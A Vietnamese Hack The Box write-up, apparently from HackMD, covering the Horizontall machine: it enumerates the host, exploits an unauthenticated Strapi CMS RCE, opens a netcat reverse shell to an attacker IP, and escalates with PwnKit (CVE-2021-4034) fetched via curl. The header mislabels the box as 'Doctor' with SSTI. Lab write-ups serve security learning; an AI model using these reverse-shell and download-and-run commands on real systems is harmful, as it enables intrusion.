![image](https://hackmd.io/_uploads/HkD2LxZjR.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/Doctor)

## Comment
Đây là một máy có lỗ hổng SSTI to RCE sau đó tiến hành leo quyền 

# Recon
## nmap 
Sau khi nmap ta scan được **2** port ssh và http 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.11.105       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 12:46 EDT
Nmap scan report for 10.10.11.105
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.30 seconds
```
Từ đây, ta sẽ scan tiếp 2 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.11.105
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 12:48 EDT
Nmap scan report for 10.10.11.105
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.99 seconds
```
Thêm domain `horizontall.htb` vào `/etc/hosts`sẽ có trang chúng ta cần

## Port 80 - http
Khi truy cập vào ta có giao diện trang web

![image](https://hackmd.io/_uploads/S1mr2x-oC.png)

Trang web này không có một tính năng gì. Khi dùng devtool để kiểm tra các gói được load, `app.c68eb462.js` đề cập đến 1 subdomain khác là **api-prod.horizontall.htb**

![image](https://hackmd.io/_uploads/BJ-bAgWj0.png)

Thêm subdomain `api-prod.horizontall.htb` vào `/etc/hosts` sẽ có trang mới xuất hiện

![image](https://hackmd.io/_uploads/r1xZJWWiR.png)

## Gobuster 
Kết quả ban đầu của ta từ Gobuster không thú vị lắm
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
```
Tương tự với subdomain ta có 3 path khác với `users` đã bị 403
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
/admin                (Status: 200) [Size: 854]
```

Với `/reviews` ta chưa thu thậm được gì nhiều về thông tin

![image](https://hackmd.io/_uploads/H1JXlbWiC.png)

Với `/admin` ta có 1 trang web sử dụng CMS Strapi 

![image](https://hackmd.io/_uploads/H1IdebWjA.png)

# User flag
## Exploit
### Searchsploit

![image](https://hackmd.io/_uploads/BkNE7ZWi0.png)

Nó cho ta kết quả của 3 loại khác thác đầu tiên lạm dụng cách Strapi xử lý sai các yêu cầu đặt lại mật khẩu; và thứ hai cho phép thực thi mã từ xa trong các thành phần cài đặt plugin vì nó không kiểm tra tên plugin.

`50237.py`

Đọc file này ta có thể xem được version của web mình là **3.0.0-beta.17.4**

![image](https://hackmd.io/_uploads/SkH_Lb-iC.png)

![image](https://hackmd.io/_uploads/SyuUIZZsC.png)

Từ đây khai thác bằng `Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)` 

![image](https://hackmd.io/_uploads/Bki_KZ-i0.png)

### Reverse shell
Vì nó là blind RCE khi chạy script nên ta sẽ dùng reverse dshell để nghe 
```
mkfifo /tmp/lol;nc 10.10.14.93 1234 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```
![image](https://hackmd.io/_uploads/HyeyqZ-iR.png)

## Post-Exploit
```
$ cd /home
$ ls
developer
$ cd developer
$ ls
composer-setup.php
myproject
user.txt
$ cat user.txt
bf57a050fcb876ba6eb********
```
# Root flag
## Exploit
Tải linPeas về máy mục tiêu và chạy file
```
$ cd /tmp
$ curl http://10.10.14.93:8888/linpeas.sh -o linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.s
```
Khi chạy LinPeas ta thấy mục tiêu dễ bị tấn công bởi **CVE-2021-4034** (PwnKit privesc). Đây là một lỗ hổng leo thang đặc quyền trong linux sử dụng [PwnKit](https://github.com/ly4k/PwnKit?ref=avitek.blog). 

![image](https://hackmd.io/_uploads/HylYoWWiC.png)

```
#Máy tấn công 
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

#Máy mục tiêu
$ curl http://10.10.14.93:8888/PwnKit -o PwnKit
$ chmod +x PwnKit                                    
$ ./PwnKit
mesg: ttyname failed: Inappropriate ioctl for device
id
uid=0(root) gid=0(root) groups=0(root),1001(strapi)
```
## Post-Exploit
```
cat /root/root.txt
4113991bda122b655c8a6*****
```

![image](https://hackmd.io/_uploads/HyNszfboA.png)


